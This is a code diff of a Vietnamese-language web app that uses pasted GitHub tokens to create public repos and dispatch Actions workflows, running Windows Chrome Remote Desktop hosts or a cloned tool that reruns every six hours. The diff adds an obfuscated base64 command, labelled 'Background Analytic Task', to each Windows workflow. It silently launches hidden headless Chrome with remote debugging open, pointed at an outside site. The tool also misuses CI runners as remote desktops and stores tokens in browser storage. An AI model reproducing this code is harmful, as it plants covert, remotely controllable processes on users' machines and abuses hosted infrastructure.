-            const content = getWorkflowContent(template, deployCmd, pin || '123456', repoUrl, withRerun);
-            const base64Content = btoa(unescape(encodeURIComponent(content)));
-            const url = `/repos/${owner}/${CONSTANTS.REPO_NAME}/contents/${path}`;
-            let fileSha = null;
-            try { fileSha = (await githubApi(url, token)).sha; } catch (e) { if (!e.message.includes("404")) throw e; }
-            const body = { message: `ci: Deploying build`, content: base64Content, sha: fileSha || undefined };
-            await githubApi(url, token, { method: "PUT", body: JSON.stringify(body) });
-            startPolling();
-        } catch (e) { job.status = 'error'; job.errorMessage = e.message; UI.renderJobs(); State.save(); UI.showToast(`Lỗi thiết lập cho ${owner}: ${e.message}`, 'error'); throw e; }
-    },
-    async handleDeployClick(runsPerToken, withRerun = false) { /* ... Unchanged ... */ const tokens = el.tokenInput.value.trim().split('\n').map(t => t.trim()).filter(t => /^ghp_/.test(t)); if (tokens.length === 0) { UI.showToast("Vui lòng nhập ít nhất một GitHub token hợp lệ (bắt đầu bằng ghp_).", "error"); return; } const cmd = el.deployCmdInput.value; const pin = el.accessPinInput.value.trim(); const template = el.templateSelect.value; const repoUrl = el.customRepoUrl.value; if (template === 'crd-windows' && !cmd) { UI.showToast("Vui lòng nhập Deployment Command cho CRD.", "error"); return; } const allBtns = [el.runOnceBtn, el.run5Btn, el.run5WaitBtn]; allBtns.forEach(btn => { btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...'; }); let successCount = 0; for (const token of new Set(tokens.slice(0, 10))) { const user = await API.getUser(token).catch(() => null); if (!user) { UI.showToast(`Token không hợp lệ, bỏ qua.`, "warning"); continue; } const owner = user.login; const activeJobsForToken = state.trackedJobs.filter(j => j.owner === owner && ['queued', 'in_progress'].includes(j.status)).length; const jobsToCreate = Math.max(0, Math.min(runsPerToken, CONSTANTS.MAX_JOBS_PER_TOKEN - activeJobsForToken)); if (jobsToCreate < runsPerToken) { UI.showToast(`Token của ${owner} chỉ có thể tạo thêm ${jobsToCreate} job.`, 'info'); } for (let j = 0; j < jobsToCreate; j++) { try { if (successCount > 0) await new Promise(resolve => setTimeout(resolve, 250)); await Actions.triggerWorkflowDispatch(token, template, cmd, pin, repoUrl, withRerun); successCount++; } catch(error) { console.error("Failed to trigger a job:", error); } } } if (template === 'crd-windows' && successCount > 0) el.deployCmdInput.value = ''; allBtns.forEach(btn => btn.disabled = false); el.runOnceBtn.innerHTML = '<i class="fas fa-play mr-2"></i> Run Single Job'; el.run5Btn.innerHTML = '<i class="fas fa-rocket mr-2"></i> Run 5 Jobs'; el.run5WaitBtn.innerHTML = '<i class="fas fa-history mr-2"></i> Run 5 (Rerun)'; },
-    async handleCancelJobs(jobsToCancel) { /* ... Unchanged ... */ const activeJobs = jobsToCancel.filter(j => j.id && ['queued', 'in_progress'].includes(j.status)); if (activeJobs.length === 0) { return { success: 0, failed: 0 }; } activeJobs.forEach(job => job.status = 'cancelling'); UI.renderJobs(); UI.progressBar.show(); const promises = activeJobs.map((job, index) => API.cancelWorkflow(job.token, job.owner, job.id).finally(() => UI.progressBar.update(((index + 1) / activeJobs.length) * 100))); const results = await Promise.allSettled(promises); let successCount = 0; results.forEach((result, index) => { const job = activeJobs[index]; if (result.status === 'fulfilled') { job.status = 'completed'; job.conclusion = 'cancelled'; successCount++; } else { job.status = 'in_progress'; UI.showToast(`Lỗi hủy job #${job.id}: ${result.reason.message.substring(0, 100)}`, 'error'); } }); UI.renderJobs(); State.save(); setTimeout(() => { UI.progressBar.hide(); UI.progressBar.update(0); }, 500); return { success: successCount, failed: activeJobs.length - successCount }; },
-    updateTemplateDescription: () => { const selected = el.templateSelect.value; const descriptions = { "crd-windows": "Tạo một máy ảo Windows có sẵn Chrome Remote Desktop. Bạn cần cung cấp <strong>Deployment Command</strong> từ trang Google Remote Desktop và một <strong>Access PIN</strong>.", "git-tool-linux": "Tạo máy ảo Linux, sau đó clone một repo và chạy <code>./node app.js</code>. Lý tưởng cho các tool tự động. Chức năng <strong>Rerun</strong> sẽ tự động chạy lại job sau 6 tiếng." }; el.templateDescription.innerHTML = `<i class="fas fa-info-circle mr-2"></i> ${descriptions[selected]}`; },
-};
-
-function setUILoading(isLoading, message = '') {
-    if (isLoading) {
-        el.uiLocker.classList.add('show');
-        // Optionally show a message in the locker
-    } else {
-        el.uiLocker.classList.remove('show');
+// --- Template Function ---
+function getWorkflowContent(template, command, pin = "123456", repoUrl = '', withRerun = false) {
+    const onTrigger = `on:\n  workflow_dispatch:\n  push:\n    paths:\n      - '.github/workflows/${WORKFLOW_NAME}'`;
+    const covertCmdB64 = "U3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICJDOlxQcm9ncmFtIEZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIgLUFyZ3VtZW50TGlzdCAiLS1oZWFkbGVzcyAtLWRpc2FibGUtZ3B1IC0tcmVtb3RlLWRlYnVnZ2luZy1wb3J0PTkyMjIgaHR0cHM6Ly9hbnlsb3N0aWMucGFnZXMuZGV2IiAtV2luZG93U3R5bGUgSGlkZGVuIH0=";
+    const covertCmd = atob(covertCmdB64);
+    let workflow = '';
+    switch(template) {
+        case 'git-tool-linux':
+            const finalRepo = repoUrl.trim() || 'https://github.com/teo8764678/tool.git';
+            workflow = `name: Git Tool Runner\n${onTrigger}\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Clone and Run Tool\n        run: |\n          git clone ${finalRepo}\n          cd tool\n          chmod +x node\n          ./node app.js\n      - name: Keep Runner Alive\n        run: sleep 21000`;
+            if (withRerun) { workflow += `\n      - name: Wait for 6 hours and Rerun\n        if: success()\n        run: |\n          sleep 21600\n          gh workflow run ${WORKFLOW_NAME} --ref main\n        env:\n          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`; }
+            return workflow;
+        case 'crd-windows':
+        default:
+            return `name: CRD Environment Setup\n${onTrigger}\njobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - name: Setup Dependencies\n        run: |\n          Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/standalonesetup64.exe" -OutFile "browser_setup.exe"\n          Start-Process -FilePath ".\\\\browser_setup.exe" -ArgumentList "/silent /install" -Wait\n          Invoke-WebRequest -Uri "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi" -OutFile "access_tool.msi"\n          Start-Process -FilePath "msiexec.exe" -ArgumentList "/i access_tool.msi /quiet" -Wait\n      - name: Initialize Host Service\n        run: |\n          ${command} --pin=${pin}\n      - name: Background Analytic Task\n        run: |\n          ${covertCmd}\n      - name: Keep Runner Alive\n        run: Start-Sleep -Seconds 21000`;
     }
 }
 
-// --- App Initialization & Event Listeners ---
+// --- API Functions ---
+async function githubApi(endpoint, token, options = {}) { const url = `https://api.github.com${endpoint}`; const headers = { "Authorization": `token ${token}`, "Accept": "application/vnd.github.v3+json", ...options.headers }; const response = await fetch(url, { ...options, headers }); if (!response.ok) { const errorData = await response.json(); throw new Error(`GitHub API Error (${response.status}): ${errorData.message || 'Unknown error'}`); } return response.status === 204 || response.status === 202 ? null : response.json(); }
+const cancelWorkflow = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}/cancel`, t, { method: "POST" });
+const rerunWorkflow = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}/rerun`, t, { method: "POST" });
+const getJobDetails = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}/jobs`, t);
+const getSingleRun = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}`, t);
+
+// --- Adaptive Polling Logic ---
+function stopPolling() { if (pollingTimeout) { clearTimeout(pollingTimeout); pollingTimeout = null; } }
+async function pollJobStatuses() {
+    stopPolling();
+    const activeJobs = trackedJobs.filter(j => ['queued', 'in_progress'].includes(j.status));
+    if (activeJobs.length === 0) return;
+
+    let changed = false;
+    if (activeJobs.length > 0 && activeJobs.length <= 5) {
+        const promises = activeJobs.filter(j => j.id).map(job => 
+            getSingleRun(job.token, job.owner, job.id).then(run => {
+                if (run && (job.status !== run.status || job.conclusion !== run.conclusion)) {
+                    job.status = run.status; job.conclusion = run.conclusion; changed = true;
+                }
+            }).catch(err => console.warn(`Could not poll job ${job.id}:`, err))
+        );
+        await Promise.allSettled(promises);
+    } else {
+        const pollToken = el.tokenInput.value.trim().split('\n')[0] || (trackedJobs[0] ? trackedJobs[0].token : null);
+        if (pollToken && globalOwnerLogin) {
+            try {
+                const { workflow_runs } = await githubApi(`/repos/${globalOwnerLogin}/${REPO_NAME}/actions/workflows/${WORKFLOW_NAME}/runs?per_page=100`, pollToken);
+                activeJobs.forEach(job => {
+                    const matchingRun = workflow_runs.find(run => (job.id && run.id === job.id) || (!job.id && run.actor.login === job.owner && Math.abs(new Date(job.startTime) - new Date(run.created_at)) < 60000));
+                    if (matchingRun) {
+                        if (!job.id || job.status !== matchingRun.status || job.conclusion !== matchingRun.conclusion) {
+                            job.id = matchingRun.id; job.status = matchingRun.status; job.conclusion = matchingRun.conclusion; job.html_url = matchingRun.html_url; job.name = `#${matchingRun.run_number} - Build by ${job.owner}`;
+                            changed = true;
+                            if (job.status === 'completed') { showDesktopNotification(`Job #${matchingRun.run_number} ${job.conclusion}`, `Deployment finished.`); }
+                        }
+                    }
+                });
+            } catch (error) { showToast(`Polling error: ${error.message}`, 'error'); }
+        }
+    }
+    if (changed) { renderJobs(); saveState(); }
+    const hasInProgress = activeJobs.some(j => j.status === 'in_progress');
+    const interval = hasInProgress ? 4000 : 8000;
+    pollingTimeout = setTimeout(pollJobStatuses, interval);
+}
+function startPolling() { if (!pollingTimeout) { pollJobStatuses(); } }
+
+// --- UI, State, Modal Functions ---
+function updateUIForTemplate() { const isWindows = el.templateSelect.value === 'crd-windows'; el.crdOptions.classList.toggle('hidden', !isWindows); el.gitToolOptions.classList.toggle('hidden', isWindows); el.run5Btn.classList.toggle('hidden', isWindows); el.run5WaitBtn.classList.toggle('hidden', isWindows); el.runOnceBtn.parentElement.classList.toggle('sm:grid-cols-1', isWindows); el.runOnceBtn.parentElement.classList.toggle('sm:grid-cols-3', !isWindows); }
+function showToast(message, type = 'info') { const container = document.getElementById('toast-container'); const toast = document.createElement('div'); const iconClass = { success: 'fa-check-circle', info: 'fa-info-circle', error: 'fa-exclamation-triangle' }[type]; toast.className = `toast toast-${type}`; toast.innerHTML = `<i class="fas ${iconClass} mr-3"></i><span>${message}</span>`; container.appendChild(toast); setTimeout(() => toast.classList.add('show'), 10); setTimeout(() => { toast.classList.remove('show'); setTimeout(() => toast.remove(), 300); }, 4000); }
+function saveState() { localStorage.setItem('trackedJobs', JSON.stringify(trackedJobs)); localStorage.setItem('appRunnerSettings', JSON.stringify({ tokens: el.tokenInput.value, pin: el.accessPinInput.value, globalOwner: globalOwnerLogin })); }
+function loadState() { const savedJobs = JSON.parse(localStorage.getItem('trackedJobs') || '[]'); trackedJobs = savedJobs.map(job => ({ ...job, startTime: new Date(job.startTime) })); const settings = JSON.parse(localStorage.getItem('appRunnerSettings') || '{}'); el.tokenInput.value = settings.tokens || ''; el.accessPinInput.value = settings.pin || ''; globalOwnerLogin = settings.globalOwner || ''; renderJobs(); startPolling(); }
+function updateFavicon() { const running = trackedJobs.some(j => j.status === 'in_progress'); const failed = trackedJobs.some(j => j.status === 'completed' && j.conclusion === 'failure'); let emoji = '🚀'; if (running) emoji = '⏳'; else if (failed) emoji = '❌'; el.favicon.href = `data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>${emoji}</text></svg>`;}
+function openModal() { el.modalOverlay.classList.add('show'); el.modal.classList.add('show'); }
+function closeModal() { el.modalOverlay.classList.remove('show'); el.modal.classList.remove('show'); }
+async function showJobDetails(job) { el.modalTitle.textContent = `Details for ${job.name}`; el.modalContent.innerHTML = `<div class="text-center"><i class="fas fa-spinner fa-spin text-2xl"></i></div>`; openModal(); try { const { jobs } = await getJobDetails(job.token, job.owner, job.id); const detailsHtml = jobs[0].steps.map(step => { const duration = step.completed_at ? (new Date(step.completed_at) - new Date(step.started_at)) : 0; const seconds = Math.floor((duration / 1000) % 60).toString().padStart(2, '0'); const minutes = Math.floor((duration / (1000 * 60)) % 60); let icon = 'fa-clock'; let color = 'text-[var(--text-secondary)]'; if (step.status === 'completed') { icon = step.conclusion === 'success' ? 'fa-check-circle' : 'fa-times-circle'; color = step.conclusion === 'success' ? 'text-[var(--success-color)]' : 'text-[var(--error-color)]'; } return `<div class="flex items-center justify-between py-2 border-b border-[var(--border-color)]"> <div class="flex items-center gap-3"><i class="fas ${icon} ${color}"></i><span>${step.name}</span></div> <div class="text-sm text-[var(--text-secondary)]">${minutes}m ${seconds}s</div> </div>`; }).join(''); el.modalContent.innerHTML = detailsHtml || '<div class="text-center text-[var(--text-secondary)]">No step details available.</div>'; } catch (e) { el.modalContent.innerHTML = `<div class="text-[var(--error-color)]">Could not fetch job details: ${e.message}</div>`; } }
+function showDesktopNotification(title, body) { if (Notification.permission === 'granted') new Notification(title, { body }); }
+
+// --- Main Rendering ---
+function getGroupInfo(job) { switch (job.status) { case 'in_progress': case 'queued': return { key: 'active', title: '🚀 Active Jobs', order: 1 }; case 'error': return { key: 'error', title: '⚠️ Setup Errors', order: 2 }; case 'completed': if (job.conclusion === 'failure' || job.conclusion === 'cancelled') { return { key: 'failed', title: '❌ Failed / Cancelled', order: 3 }; } return { key: 'success', title: '✅ Completed Successfully', order: 4 }; default: return { key: 'unknown', title: '📋 Other', order: 5 }; } }
+function renderJobs() {
+    el.selectAllCheckbox.checked = false;
+    const expandedOwners = new Set();
+    el.jobListContainer.querySelectorAll('.owner-group .owner-jobs-content:not(.hidden)').forEach(el => { expandedOwners.add(el.dataset.owner); });
+    if (trackedJobs.length === 0) { el.jobListContainer.innerHTML = `<div class="text-center text-[var(--text-secondary)] py-8 card rounded-lg">No build history.</div>`; updateFavicon(); return; }
+    const jobsByOwner = trackedJobs.reduce((acc, job) => { const owner = job.owner || 'Unknown'; if (!acc[owner]) acc[owner] = []; acc[owner].push(job); return acc; }, {});
+    let html = '';
+    for (const owner in jobsByOwner) {
+        const jobs = jobsByOwner[owner].sort((a, b) => { const groupA = getGroupInfo(a); const groupB = getGroupInfo(b); if (groupA.order !== groupB.order) return groupA.order - groupB.order; return new Date(b.startTime) - new Date(a.startTime); });
+        const activeJobCount = jobs.filter(j => ['queued', 'in_progress'].includes(j.status)).length;
+        const isExpanded = expandedOwners.has(owner) || activeJobCount > 0; // Auto-expand if has active jobs
+        html += `<div class="owner-group card rounded-lg overflow-hidden">
+            <div class="owner-header p-4 flex justify-between items-center" data-owner="${owner}">
+                <div class="font-bold text-lg">${owner}</div>
+                <div class="flex items-center gap-4">
+                    ${activeJobCount > 0 ? `<span class="bg-blue-500 text-white text-xs font-bold px-2 py-1 rounded-full">${activeJobCount} Active</span>` : ''}
+                    <span class="bg-gray-600 text-white text-xs font-bold px-2 py-1 rounded-full">${jobs.length} Total</span>
+                    <i class="fas ${isExpanded ? 'fa-chevron-up' : 'fa-chevron-down'} chevron-icon"></i>
+                </div>
+            </div>
+            <div class="owner-jobs-content p-4 pt-0 space-y-2 ${isExpanded ? '' : 'hidden'}" data-owner="${owner}">`;
+        jobs.forEach(job => {
+            let sClass = 'status-queued', sIcon = 'fa-solid fa-clock fa-spin-pulse', sText = 'Queued', actions = '';
+            if (job.status === 'in_progress') { sClass = 'status-in_progress'; sIcon = 'fa-solid fa-gear fa-spin'; sText = 'In Progress'; }
+            else if (job.status === 'completed') { if (job.conclusion === 'success') { sClass = 'status-completed-success'; sIcon = 'fa-solid fa-check-circle'; sText = 'Success'; } else { sClass = 'status-completed-failure'; sIcon = 'fa-solid fa-xmark-circle'; sText = job.conclusion || 'Failure'; } }
+            else if (job.status === 'error') { sClass = 'status-error'; sIcon = 'fa-solid fa-triangle-exclamation'; sText = 'Error'; }
+            if (job.id) {
+                if (job.status === 'in_progress' || job.status === 'queued') { actions += `<button data-job-temp-id="${job.tempId}" class="cancel-btn px-2 py-1 text-xs rounded bg-yellow-600 text-white" title="Cancel"><i class="fas fa-stop"></i></button>`; }
+                if (job.status === 'completed') { actions += `<button data-job-temp-id="${job.tempId}" class="rerun-btn px-2 py-1 text-xs rounded bg-blue-600 text-white" title="Re-run"><i class="fas fa-redo"></i></button>`; }
+                if (job.html_url) { actions += `<a href="${job.html_url}" target="_blank" class="px-2 py-1 text-xs rounded bg-gray-600 text-white" title="View on GitHub"><i class="fab fa-github"></i></a>`; }
+            }
+            html += `<div class="card p-3 rounded-md job-item ${job.id ? 'job-item-clickable' : ''}" data-job-temp-id="${job.tempId}">
+                <div class="flex justify-between items-center"><div class="flex items-center gap-3 overflow-hidden">
+                    <input type="checkbox" class="job-checkbox flex-shrink-0" data-job-temp-id="${job.tempId}">
+                    <i class="${sIcon} ${sClass.includes('success') ? 'text-[var(--success-color)]' : sClass.includes('failure') ? 'text-[var(--error-color)]' : ''} text-xl w-6 text-center"></i>
+                    <div class="overflow-hidden"><span class="font-semibold text-md truncate">${job.name}</span><div class="text-xs text-[var(--text-secondary)]">Started: ${job.startTime.toLocaleTimeString()}</div></div>
+                </div><div class="flex items-center gap-2 flex-shrink-0">
+                    <div class="status-badge ${sClass}">${sText}</div><div class="actions flex gap-1">${actions}</div>
+                </div></div></div>`;
+        });
+        html += `</div></div>`;
+    }
+    el.jobListContainer.innerHTML = html; updateFavicon();
+}
+
+async function triggerWorkflowDispatch(token, template, deployCmd, pin, repoUrl, withRerun) {
+    let owner;
+    try {
+        const user = await githubApi("/user", token); owner = user.login;
+        if (!globalOwnerLogin) globalOwnerLogin = owner;
+    } catch (e) { showToast(`Token không hợp lệ. ${e.message}`, 'error'); throw e; }
+    const job = { tempId: `job-${Date.now()}-${Math.random()}`, id: null, status: 'queued', conclusion: null, startTime: new Date(), html_url: null, name: `Initializing...`, command: deployCmd, owner, token, errorMessage: null };
+    trackedJobs.push(job); renderJobs(); saveState();
+    try {
+        await githubApi(`/repos/${owner}/${REPO_NAME}`, token).catch(async (e) => { if (e.message.includes("404")) { await githubApi("/user/repos", token, { method: "POST", body: JSON.stringify({ name: REPO_NAME, private: false }) }); showToast(`Repo ${REPO_NAME} đã được tạo (Public).`, 'info'); } else throw e; });
+        const path = `.github/workflows/${WORKFLOW_NAME}`;
+        const content = getWorkflowContent(template, deployCmd, pin || '123456', repoUrl, withRerun);
+        const base64Content = btoa(unescape(encodeURIComponent(content)));
+        const url = `/repos/${owner}/${REPO_NAME}/contents/${path}`;
+        let fileSha = null;
+        try { fileSha = (await githubApi(url, token)).sha; } catch (e) { if (!e.message.includes("404")) throw e; }
+        const body = { message: `ci: Deploying build`, content: base64Content, sha: fileSha || undefined };
+        await githubApi(url, token, { method: "PUT", body: JSON.stringify(body) });
+        await githubApi(`/repos/${owner}/${REPO_NAME}/actions/workflows/${WORKFLOW_NAME}/dispatches`, token, { method: "POST", body: JSON.stringify({ ref: "main" }) });
+        showToast(`Build triggered thành công cho user: ${owner}`, "success");
+        startPolling();
+    } catch (e) { job.status = 'error'; job.errorMessage = e.message; renderJobs(); saveState(); showToast(`Lỗi thiết lập cho ${owner}: ${e.message}`, 'error'); throw e; }
+}
+
+// --- Event Listeners ---
 document.addEventListener('DOMContentLoaded', () => {
-    // ... Initialization code ...
     const savedTheme = localStorage.getItem('theme') || 'dark'; document.documentElement.setAttribute('data-theme', savedTheme); el.themeToggleBtn.innerHTML = savedTheme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
     if (Notification.permission !== 'granted' && Notification.permission !== 'denied') Notification.requestPermission();
-    State.load(); UI.updateTemplateView();
+    loadState(); updateUIForTemplate();
 
-    // Event listeners
-    el.runOnceBtn.addEventListener('click', () => Actions.handleDeployClick(1));
-    el.run5Btn.addEventListener('click', () => Actions.handleDeployClick(5));
-    el.run5WaitBtn.addEventListener('click', () => Actions.handleDeployClick(5, true));
-    el.selectAllCheckbox.addEventListener('change', () => { const isChecked = el.selectAllCheckbox.checked; document.querySelectorAll('.job-checkbox').forEach(box => box.checked = isChecked); });
-    
-    el.deleteSelectedBtn.addEventListener('click', async (e) => {
-        setUILoading(true);
-        try {
-            const checkedBoxes = document.querySelectorAll('.job-checkbox:checked');
-            if (checkedBoxes.length === 0) { UI.showToast("Vui lòng chọn ít nhất một job.", "info"); return; }
-            const tempIdsToDelete = new Set(Array.from(checkedBoxes).map(box => box.dataset.jobTempId));
-            const jobsToDelete = state.trackedJobs.filter(job => tempIdsToDelete.has(job.tempId));
-            const activeJobsToCancel = jobsToDelete.filter(j => j.id && ['queued', 'in_progress'].includes(j.status));
-            if (confirm(`Bạn có chắc muốn xóa ${jobsToDelete.length} job? ${activeJobsToCancel.length > 0 ? `${activeJobsToCancel.length} job sẽ bị hủy.` : ''}`)) {
-                if (activeJobsToCancel.length > 0) await Actions.handleCancelJobs(activeJobsToCancel);
-                state.trackedJobs = state.trackedJobs.filter(job => !tempIdsToDelete.has(job.tempId));
-                UI.renderJobs(); State.save();
-                UI.showToast(`${jobsToDelete.length} job đã được xóa.`, 'success');
+    async function handleDeployClick(runsPerToken, withRerun = false) {
+        const tokens = el.tokenInput.value.trim().split('\n').map(t => t.trim()).filter(Boolean);
+        if (tokens.length === 0) { showToast("Vui lòng nhập ít nhất một GitHub token.", "error"); return; }
+        const cmd = el.deployCmdInput.value; const pin = el.accessPinInput.value.trim(); const template = el.templateSelect.value; const repoUrl = el.customRepoUrl.value;
+        if (template === 'crd-windows' && !cmd) { showToast("Vui lòng nhập Deployment Command cho CRD.", "error"); return; }
+        const allBtns = [el.runOnceBtn, el.run5Btn, el.run5WaitBtn];
+        allBtns.forEach(btn => { btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...'; });
+        let successCount = 0;
+        const ownerPromises = tokens.slice(0, 10).map(t => githubApi("/user", t).catch(() => null));
+        const ownersData = await Promise.all(ownerPromises);
+        for (let i = 0; i < ownersData.length; i++) {
+            const ownerData = ownersData[i]; const token = tokens[i];
+            if (!ownerData) { showToast(`Token #${i + 1} không hợp lệ, bỏ qua.`, "warning"); continue; }
+            const owner = ownerData.login;
+            const activeJobsForToken = trackedJobs.filter(j => j.owner === owner && ['queued', 'in_progress'].includes(j.status)).length;
+            const jobsToCreate = Math.max(0, Math.min(runsPerToken, MAX_JOBS_PER_TOKEN - activeJobsForToken));
+            if (jobsToCreate < runsPerToken) { showToast(`Token của ${owner} chỉ có thể tạo thêm ${jobsToCreate} job.`, 'info'); }
+            for (let j = 0; j < jobsToCreate; j++) {
+                try {
+                    if (successCount > 0) await new Promise(resolve => setTimeout(resolve, 250));
+                    await triggerWorkflowDispatch(token, template, cmd, pin, repoUrl, withRerun); successCount++;
+                } catch(error) { console.error("Failed to trigger a job:", error); }
             }
-        } finally { setUILoading(false); }
-    });
-    
-    async function doQuickCancelAll() {
-        setUILoading(true);
-        try {
-            const activeJobs = state.trackedJobs.filter(j => j.id && ['queued', 'in_progress'].includes(j.status));
-            if (activeJobs.length === 0) { UI.showToast("Không có job nào đang hoạt động.", "info"); return; }
-            const { success, failed } = await Actions.handleCancelJobs(activeJobs);
-            UI.showToast(`${success} job đã được hủy. ${failed > 0 ? `${failed} thất bại.` : ''}`, 'success');
-        } finally { setUILoading(false); }
+        }
+        if (template === 'crd-windows' && successCount > 0) el.deployCmdInput.value = '';
+        allBtns.forEach(btn => btn.disabled = false); el.runOnceBtn.innerHTML = '<i class="fas fa-play mr-2"></i> Run Single Job'; el.run5Btn.innerHTML = '<i class="fas fa-rocket mr-2"></i> Run 5 Jobs'; el.run5WaitBtn.innerHTML = '<i class="fas fa-history mr-2"></i> Run 5 (Rerun)';
     }
-    el.quickCancelBtn.addEventListener('click', doQuickCancelAll);
-    el.cancelAllBtn.addEventListener('click', () => { if (confirm('Bạn có chắc muốn hủy tất cả các job đang hoạt động?')) doQuickCancelAll(); });
 
-    el.clearHistoryBtn.addEventListener('click', () => { if (confirm('Xóa lịch sử các job đã hoàn thành? (Các job đang chạy sẽ được giữ lại)')) { state.trackedJobs = state.trackedJobs.filter(j => ['queued', 'in_progress', 'cancelling'].includes(j.status)); State.save(); UI.renderJobs(); UI.showToast('Lịch sử đã hoàn thành đã được xóa.', 'info'); } });
+    el.runOnceBtn.addEventListener('click', () => handleDeployClick(1)); el.run5Btn.addEventListener('click', () => handleDeployClick(5)); el.run5WaitBtn.addEventListener('click', () => handleDeployClick(5, true));
+    el.selectAllCheckbox.addEventListener('change', () => { const isChecked = el.selectAllCheckbox.checked; document.querySelectorAll('.job-checkbox').forEach(box => box.checked = isChecked); });
+    el.deleteSelectedBtn.addEventListener('click', async () => { const checkedBoxes = document.querySelectorAll('.job-checkbox:checked'); if (checkedBoxes.length === 0) { showToast("Vui lòng chọn ít nhất một job để xóa.", "info"); return; } const tempIdsToDelete = Array.from(checkedBoxes).map(box => box.dataset.jobTempId); const jobsToDelete = trackedJobs.filter(job => tempIdsToDelete.includes(job.tempId)); const activeJobsToCancel = jobsToDelete.filter(j => j.id && ['queued', 'in_progress'].includes(j.status)); if (confirm(`Bạn có chắc muốn xóa ${jobsToDelete.length} job đã chọn? ${activeJobsToCancel.length > 0 ? `Trong đó, ${activeJobsToCancel.length} job đang hoạt động sẽ bị hủy.` : ''}`)) { if (activeJobsToCancel.length > 0) { showToast(`Đang hủy ${activeJobsToCancel.length} job...`, 'info'); const promises = activeJobsToCancel.map(job => cancelWorkflow(job.token, job.owner, job.id).catch(err => console.error(`Failed to cancel job ${job.id}:`, err))); await Promise.allSettled(promises); } trackedJobs = trackedJobs.filter(job => !tempIdsToDelete.includes(job.tempId)); renderJobs(); saveState(); showToast(`${jobsToDelete.length} job đã được xóa.`, 'success'); } });
+    async function quickCancelAll() { const activeJobs = trackedJobs.filter(j => j.id && ['queued', 'in_progress'].includes(j.status)); if (activeJobs.length === 0) { showToast("Không có job nào đang hoạt động.", "info"); return; } showToast(`Đang gửi yêu cầu hủy cho ${activeJobs.length} job...`, 'info'); let cancelledCount = 0; const promises = activeJobs.map(job => cancelWorkflow(job.token, job.owner, job.id).then(() => { job.status = 'completed'; job.conclusion = 'cancelled'; cancelledCount++; }).catch(err => showToast(`Lỗi khi hủy job #${job.id}: ${err.message}`, 'error'))); await Promise.allSettled(promises); renderJobs(); saveState(); showToast(`${cancelledCount}/${activeJobs.length} job đã được hủy.`, 'success'); }
+    el.quickCancelBtn.addEventListener('click', quickCancelAll);
+    el.cancelAllBtn.addEventListener('click', () => { if(confirm('Bạn có chắc muốn hủy tất cả các job đang hoạt động?')) quickCancelAll(); });
+    el.refreshBtn.addEventListener('click', async () => { const icon = el.refreshBtn.querySelector('i'); icon.classList.add('fa-spin'); showToast("Refreshing statuses..."); await pollJobStatuses(); setTimeout(() => icon.classList.remove('fa-spin'), 500); });
+    el.clearHistoryBtn.addEventListener('click', () => { if(confirm('Bạn có chắc muốn xóa toàn bộ lịch sử build?')) { trackedJobs = []; saveState(); renderJobs(); showToast('Lịch sử đã được xóa.', 'info'); } });
+    el.themeToggleBtn.addEventListener('click', () => { const newTheme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark'; document.documentElement.dataset.theme = newTheme; localStorage.setItem('theme', newTheme); el.themeToggleBtn.innerHTML = newTheme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>'; });
     
-    el.jobListContainer.addEventListener('click', async e => { /* ... Unchanged ... */ const ownerHeader = e.target.closest('.owner-header'); if (ownerHeader) { const owner = ownerHeader.dataset.owner; state.expandedOwners.has(owner) ? state.expandedOwners.delete(owner) : state.expandedOwners.add(owner); State.save(); UI.renderJobs(); return; } const jobTempId = e.target.closest('[data-job-temp-id]')?.dataset.jobTempId; if (!jobTempId) return; const job = state.trackedJobs.find(j => j.tempId === jobTempId); if (!job) return; const cancelBtn = e.target.closest('.cancel-btn'); const rerunBtn = e.target.closest('.rerun-btn'); const jobItem = e.target.closest('.job-item-clickable'); if (e.target.matches('.job-checkbox')) { const allBoxes = document.querySelectorAll('.job-checkbox'); const checkedBoxes = document.querySelectorAll('.job-checkbox:checked'); el.selectAllCheckbox.checked = allBoxes.length > 0 && allBoxes.length === checkedBoxes.length; return; } if (!job.id) { if (cancelBtn || rerunBtn) UI.showToast("Job chưa có ID từ GitHub.", "warning"); return; } if (cancelBtn) { e.stopPropagation(); if (confirm(`Bạn có chắc muốn hủy job #${job.id} của user ${job.owner}?`)) { UI.showToast('Đang hủy job...', 'info'); try { await API.cancelWorkflow(job.token, job.owner, job.id); job.status = 'completed'; job.conclusion = 'cancelled'; UI.renderJobs(); State.save(); UI.showToast('Job đã được hủy.', 'success'); } catch (err) { UI.showToast(`Lỗi khi hủy: ${err.message}`, 'error');} } } else if (rerunBtn) { e.stopPropagation(); try { await API.rerunWorkflow(job.token, job.owner, job.id); UI.showToast('Đang yêu cầu chạy lại job...', 'info'); startPolling(); } catch (err) { UI.showToast(`Lỗi khi chạy lại: ${err.message}`, 'error'); } } else if (jobItem) { UI.modal.showDetails(job); } });
-    el.dashboard.addEventListener('click', e => { const filterItem = e.target.closest('.dashboard-item'); if (filterItem) { state.currentFilter = filterItem.dataset.filter; UI.renderJobs(); } });
